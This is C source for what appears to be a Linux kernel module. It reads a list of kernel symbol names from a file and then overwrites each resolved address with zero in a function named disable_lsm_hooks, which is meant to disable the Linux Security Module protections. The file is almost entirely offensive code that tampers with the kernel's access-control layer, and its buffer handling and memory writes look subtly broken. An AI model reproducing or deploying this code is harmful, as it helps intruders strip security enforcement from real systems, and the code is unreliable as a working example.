#include "shim.h"
#include "logging.h"
#include "util.h"
#include <linux/string.h>

void load_hooks_from_file(const char *path) {
    LOG_INFO("Loading hooks from file: %s\n", path);
    struct file *file;
    mm_segment_t old_fs;
    char buffer[256];
    int bytes_read = 0, offset = 0;

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    file = filp_open(path, O_RDONLY, 0);
    if (!file || IS_ERR(file)) {
        LOG_WARN("Failed to open hook file: %s\n", path);
        set_fs(old_fs);
        return;
    }

    while ((bytes_read = kernel_read(file, buffer + offset, sizeof(buffer) - offset - 1, &file->f_pos)) > 0) {
        buffer[bytes_read + offset] = '\0';
        char *line = buffer;
        char *newline;

        while ((newline = strsep(&line, "\n")) != NULL && hook_count < MAX_HOOKS) {
            if (*newline) {
                LOG_DEBUG("Registering hook: %s\n", newline);
                hook_targets[hook_count++] = kstrdup(newline, GFP_KERNEL);
            }
        }
        offset = 0;
    }
    filp_close(file, NULL);
    set_fs(old_fs);
    LOG_INFO("Finished loading hooks.\n");
}

void disable_lsm_hooks(void) {
    LOG_INFO("Disabling registered hooks.\n");
    for (int i = 0; i < hook_count; i++) {
        uintptr_t hook_addr = find_kernel_symbol(hook_targets[i]);
        if (hook_addr) {
            LOG_DEBUG("Disabling hook at address: %p\n", (void *)hook_addr);
            *(uintptr_t *)hook_addr = 0;
        } else {
            LOG_WARN("Failed to resolve hook: %s\n", hook_targets[i]);
        }
    }
    LOG_INFO("Finished disabling hooks.\n");
}
